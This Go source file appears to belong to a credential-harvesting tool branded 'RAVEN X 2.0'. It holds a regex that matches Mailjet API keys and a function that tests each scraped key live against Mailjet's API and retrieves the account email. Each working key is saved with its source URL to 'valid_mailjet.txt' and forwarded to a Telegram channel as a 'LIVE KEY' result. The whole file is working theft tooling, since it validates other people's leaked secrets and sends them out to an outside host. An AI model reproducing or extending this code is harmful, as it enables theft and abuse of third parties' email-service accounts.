package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"time"
)

var mailjetPattern = regexp.MustCompile(`(?i)(?:mailjet[_-]?(?:api[_-]?)?(?:key|public))["'\s:=]+([a-f0-9]{32})`)

func (a *AWSScanner) CheckMailjet(key, sourceURL string) bool {
	if !a.Config.APIValidation.Mailjet {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	req, err := http.NewRequest("GET", "https://api.mailjet.com/v3/REST/user", nil)
	if err != nil {
		return false
	}
	req.SetBasicAuth(key, key)
	req.Header.Set("Accept", "application/json")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	req = req.WithContext(ctx)

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false
	}

	var res struct {
		Data []struct {
			Email string `json:"Email"`
		} `json:"Data"`
	}
	json.NewDecoder(resp.Body).Decode(&res)
	info := ""
	if len(res.Data) > 0 {
		info = res.Data[0].Email
	}

	a.logValid("Mailjet", fmt.Sprintf("Key: %s | Email: %s", key, info))
	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_mailjet.txt")
	a.storeValidKeyLimit("Mailjet", key, info)

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
✉️ <b>MAILJET LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
📧 <b>Email:</b> %s
🔗 <b>Source:</b> %s
`, key, info, sourceURL)
	go a.sendTelegram(msg)
	return true
}
